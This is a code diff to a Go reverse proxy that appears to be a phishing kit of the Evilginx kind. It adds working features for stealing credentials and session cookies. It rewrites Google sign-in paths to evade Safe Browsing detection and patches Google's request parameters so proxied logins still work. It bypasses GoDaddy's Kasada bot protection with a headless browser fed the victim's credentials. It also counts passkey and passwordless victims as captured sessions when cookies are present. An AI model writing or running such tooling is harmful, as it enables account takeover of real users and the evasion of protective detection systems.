@@ -88,6 +88,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	rewrittenUrls     map[string]string // URL rewriting: maps rewritten URL -> original URL (Safe Browsing evasion)
+	rewriteMutex      sync.RWMutex      // Thread-safe access to rewrittenUrls map
 }
 
 type ProxySession struct {
@@ -205,6 +207,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
+	p.rewrittenUrls = make(map[string]string) // Initialize URL rewriting map for Safe Browsing evasion
 
 	// Start auto-notifier daemon for 100% reliable automatic telegram notifications
 	// DISABLED: OLD AUTO-NOTIFIER COMPLETELY REMOVED
@@ -301,6 +304,115 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
+
+			// ========== URL REWRITING CHECK (Safe Browsing Evasion) ==========
+			// This section handles URL path rewriting to evade Google Safe Browsing detection
+			// by transforming known-flagged paths (like /v3/signin/identifier) into innocuous ones
+			if pl != nil {
+				// First, check if this is a previously rewritten URL that needs to be restored
+				rewrittenPath := req.URL.Path
+				if req.URL.RawQuery != "" {
+					rewrittenPath += "?" + req.URL.RawQuery
+				}
+
+				if originalUrl, found := p.getOriginalUrl(rewrittenPath); found {
+					// This is a rewritten URL - restore the original path for proxying
+					log.Debug("[URLRewrite] Restoring original URL: %s -> %s", rewrittenPath, originalUrl)
+
+					parsedUrl, err := url.Parse(originalUrl)
+					if err == nil {
+						req.URL.Path = parsedUrl.Path
+						req.URL.RawQuery = parsedUrl.RawQuery
+						// Update local variables
+						req_path = req.URL.Path
+						req_url = req.URL.Scheme + "://" + req.Host + req.URL.Path
+						if req.URL.RawQuery != "" {
+							req_url += "?" + req.URL.RawQuery
+						}
+						lure_url = req_url
+					}
+
+					// Clean up the mapping after use (one-time redirect)
+					p.cleanupRewriteMapping(rewrittenPath)
+				} else {
+					// Check if this URL should be rewritten (triggers Safe Browsing evasion)
+					origHost, _ := p.replaceHostWithOriginal(req.Host)
+					if shouldRewrite, rewrittenUrlPath, originalPath := p.checkUrlRewrite(pl, origHost, req.URL.Path, req.URL.Query()); shouldRewrite {
+						log.Important("[URLRewrite] Safe Browsing evasion: %s -> %s", originalPath, rewrittenUrlPath)
+
+						// Store the mapping for when the browser follows the redirect
+						p.storeRewriteMapping(rewrittenUrlPath, originalPath)
+
+						// Send 302 redirect to the rewritten URL
+						redirectUrl := "https://" + req.Host + rewrittenUrlPath
+						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+						if resp != nil {
+							resp.Header.Set("Location", redirectUrl)
+							resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+							return req, resp
+						}
+					}
+				}
+			}
+			// ========== END URL REWRITING CHECK ==========
+
+			// ========== SOURCE-PATH PARAMETER FIX (for URL Rewriting) ==========
+			// Google's JavaScript captures the current URL path and sends it in the
+			// source-path query parameter of batchexecute requests. When URL rewriting
+			// is active, this sends the rewritten path (e.g., /auth/sso/login) instead
+			// of the original Google path, causing Google to reject the request.
+			// This section rewrites the source-path parameter back to the original path.
+			if pl != nil && req.URL.RawQuery != "" && strings.Contains(req.URL.RawQuery, "source-path=") {
+				rules := pl.GetRewriteRules()
+				if len(rules) > 0 {
+					// Parse the query string
+					queryParams := req.URL.Query()
+					sourcePath := queryParams.Get("source-path")
+
+					if sourcePath != "" {
+						// URL-decode the source-path value
+						decodedSourcePath, err := url.QueryUnescape(sourcePath)
+						if err == nil {
+							// Parse the source-path to extract just the path portion
+							sourcePathUrl, err := url.Parse(decodedSourcePath)
+							if err == nil {
+								originalSourcePath := sourcePathUrl.Path
+
+								// Check if this path matches any rewrite rule's rewritten path
+								for _, rule := range rules {
+									if originalSourcePath == rule.RewritePath {
+										// Found a match - this is a rewritten path that needs to be restored
+										// Use the first trigger path as the original (strip the regex markers)
+										if len(rule.TriggerPaths) > 0 {
+											// Extract the base path from the trigger regex
+											// e.g., "^/v3/signin/identifier.*" -> "/v3/signin/identifier"
+											triggerPath := rule.TriggerPaths[0].String()
+											// Remove regex anchors and wildcards
+											triggerPath = strings.TrimPrefix(triggerPath, "^")
+											triggerPath = strings.TrimSuffix(triggerPath, ".*")
+											triggerPath = strings.TrimSuffix(triggerPath, "$")
+
+											// Reconstruct the source-path with original path but preserve query params
+											newSourcePath := triggerPath
+											if sourcePathUrl.RawQuery != "" {
+												newSourcePath += "?" + sourcePathUrl.RawQuery
+											}
+
+											// URL-encode and update the query parameter
+											queryParams.Set("source-path", newSourcePath)
+											req.URL.RawQuery = queryParams.Encode()
+
+											log.Debug("[SourcePathFix] Rewrote source-path: %s -> %s", decodedSourcePath, newSourcePath)
+											break
+										}
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+			// ========== END SOURCE-PATH PARAMETER FIX ==========
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -1065,8 +1177,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Debug("force_post: body: %s len:%d", body, len(body))
 										}
 
-										if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=MI613e") {
-											log.Debug("GoogleBypass working with: %v", req.RequestURI)
+										// Get the original host to check against Google's domain (req.Host is still the phishing domain at this point)
+										origHostForGoogle, _ := p.replaceHostWithOriginal(req.Host)
+										if strings.EqualFold(origHostForGoogle, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=MI613e") {
+											log.Debug("GoogleBypass working with: %v (origHost: %v)", req.RequestURI, origHostForGoogle)
 
 											decodedBody, err := url.QueryUnescape(string(body))
 											if err != nil {
@@ -1093,6 +1207,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												}
 
 												req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+											}
+										}
+
+										// GoDaddy SSO Kasada Bypass
+										// Trigger when user submits login credentials to GoDaddy SSO
+										if strings.EqualFold(req.Host, "sso.godaddy.com") && strings.HasPrefix(req.URL.Path, "/v1/api/pass/login") {
+											log.Debug("[KasadaBypasser]: Triggered for request to %s%s", req.Host, req.URL.Path)
+
+											k := &KasadaBypasser{
+												isHeadless:     true,
+												slowMotionTime: 500 * time.Millisecond,
+											}
+
+											if err := k.Launch(); err != nil {
+												log.Error("[KasadaBypasser]: Failed to launch browser: %v", err)
+											} else if err := k.GetCredentials(body); err != nil {
+												log.Error("[KasadaBypasser]: Failed to get credentials: %v", err)
+											} else if err := k.GetKasadaTokens(); err != nil {
+												log.Error("[KasadaBypasser]: Failed to get Kasada tokens: %v", err)
+											} else {
+												k.InjectKasadaHeaders(req)
+												log.Info("[KasadaBypasser]: Successfully injected Kasada headers for user: %s", k.username)
 											}
 										}
 									}
@@ -2514,13 +2650,17 @@ func (p *HttpProxy) startSessionFinalizer() {
 				continue
 			}
 
-			// BULLETPROOF VALIDATION: ALL THREE must be present and NOT empty/N/A
+			// VALIDATION: Check what data we have
 			hasUsername := session.Username != "" && session.Username != "N/A"
 			hasPassword := session.Password != "" && session.Password != "N/A"
 			hasCookies := len(session.CookieTokens) > 0
 
-			// COMPLETE means ALL THREE conditions are TRUE
-			isSessionComplete := hasUsername && hasPassword && hasCookies
+			// COMPLETE SESSION CRITERIA (supports passwordless logins like passkey/fingerprint/magic link):
+			// - MUST have cookies (session tokens are the valuable part)
+			// - MUST have at least username OR password (some identifier)
+			// This allows: username + cookies (passkey), password + cookies (rare), or username + password + cookies (traditional)
+			hasCredentialInfo := hasUsername || hasPassword
+			isSessionComplete := hasCookies && hasCredentialInfo
 
 			if isSessionComplete {
 				currentCookieCount := len(session.CookieTokens)
@@ -2567,9 +2707,17 @@ func (p *HttpProxy) startSessionFinalizer() {
 					session.Id, currentCookieCount, tracker.stableCount, timeSinceFirst, currentCookieCount)
 
 				if isStable && hasMinimumTime && hasSignificantCookies {
-					log.Important("🎯 SESSION FINALIZER: Found BULLETPROOF COMPLETE session %d with FULL COOKIES", session.Id)
-					log.Important("   → Username: %s ✅", session.Username)
-					log.Important("   → Password: %s ✅", session.Password)
+					log.Important("🎯 SESSION FINALIZER: Found COMPLETE session %d with FULL COOKIES", session.Id)
+					if hasUsername {
+						log.Important("   → Username: %s ✅", session.Username)
+					} else {
+						log.Important("   → Username: (not captured - passkey/passwordless login)")
+					}
+					if hasPassword {
+						log.Important("   → Password: %s ✅", session.Password)
+					} else {
+						log.Important("   → Password: (not captured - passkey/passwordless login)")
+					}
 					log.Important("   → IP Address: %s 🌐", session.RemoteAddr)
 					log.Important("   → Cookies: %d tokens ✅ (stable for %d cycles, %v)", currentCookieCount, tracker.stableCount, timeSinceFirst)
 
@@ -3099,4 +3247,119 @@ func (p *HttpProxy) GetRequestCheckerStats() (asns, uas, ipRanges, ips int) {
 		return 0, 0, 0, 0
 	}
 	return p.requestChecker.GetStats()
+}
+
+// ============================================================================
+// URL REWRITING FOR SAFE BROWSING EVASION
+// ============================================================================
+
+// checkUrlRewrite checks if the incoming request matches any URL rewrite rules
+// and returns the rewritten URL if a match is found
+// Returns: (shouldRewrite bool, rewrittenPath string, originalPath string)
+func (p *HttpProxy) checkUrlRewrite(pl *Phishlet, hostname string, path string, query url.Values) (bool, string, string) {
+	if pl == nil {
+		return false, "", ""
+	}
+
+	rules := pl.GetRewriteRules()
+	if len(rules) == 0 {
+		return false, "", ""
+	}
+
+	for _, rule := range rules {
+		// Check if hostname matches trigger domains
+		hostMatched := false
+		for _, d := range rule.TriggerDomains {
+			if strings.EqualFold(hostname, d) {
+				hostMatched = true
+				break
+			}
+		}
+		if !hostMatched {
+			continue
+		}
+
+		// Check if path matches trigger paths
+		pathMatched := false
+		for _, pathRe := range rule.TriggerPaths {
+			if pathRe.MatchString(path) {
+				pathMatched = true
+				break
+			}
+		}
+		if !pathMatched {
+			continue
+		}
+
+		// Build the rewritten URL
+		newPath := rule.RewritePath
+
+		// Build new query string
+		newQuery := url.Values{}
+
+		// Extract session ID from original query for {id} placeholder replacement
+		// Google uses 'dsh' parameter for session ID
+		sessionId := query.Get("dsh")
+		if sessionId == "" {
+			// Try to extract from ifkv or other session-related params
+			sessionId = query.Get("ifkv")
+		}
+
+		// Add new query parameters from rule
+		for _, q := range rule.RewriteQuery {
+			value := q.Value
+			// Replace {id} placeholder with actual session ID
+			if strings.Contains(value, "{id}") && sessionId != "" {
+				value = strings.ReplaceAll(value, "{id}", sessionId)
+			}
+			newQuery.Set(q.Key, value)
+		}
+
+		// Preserve excluded keys from original query
+		for _, key := range rule.ExcludeKeys {
+			if val := query.Get(key); val != "" {
+				newQuery.Set(key, val)
+			}
+		}
+
+		// Build final rewritten path with query
+		rewrittenPath := newPath
+		if len(newQuery) > 0 {
+			rewrittenPath += "?" + newQuery.Encode()
+		}
+
+		// Store original path with query for reverse mapping
+		originalPath := path
+		if len(query) > 0 {
+			originalPath += "?" + query.Encode()
+		}
+
+		log.Info("[URLRewrite] Matched rule: %s -> %s (Safe Browsing evasion)", originalPath, rewrittenPath)
+		return true, rewrittenPath, originalPath
+	}
+
+	return false, "", ""
+}
+
+// storeRewriteMapping stores the mapping from rewritten URL to original URL
+func (p *HttpProxy) storeRewriteMapping(rewrittenUrl string, originalUrl string) {
+	p.rewriteMutex.Lock()
+	defer p.rewriteMutex.Unlock()
+	p.rewrittenUrls[rewrittenUrl] = originalUrl
+	log.Debug("[URLRewrite] Stored mapping: %s -> %s", rewrittenUrl, originalUrl)
+}
+
+// getOriginalUrl retrieves the original URL for a rewritten URL
+func (p *HttpProxy) getOriginalUrl(rewrittenUrl string) (string, bool) {
+	p.rewriteMutex.RLock()
+	defer p.rewriteMutex.RUnlock()
+	original, ok := p.rewrittenUrls[rewrittenUrl]
+	return original, ok
+}
+
+// cleanupRewriteMapping removes a mapping after it's been used
+func (p *HttpProxy) cleanupRewriteMapping(rewrittenUrl string) {
+	p.rewriteMutex.Lock()
+	defer p.rewriteMutex.Unlock()
+	delete(p.rewrittenUrls, rewrittenUrl)
 }
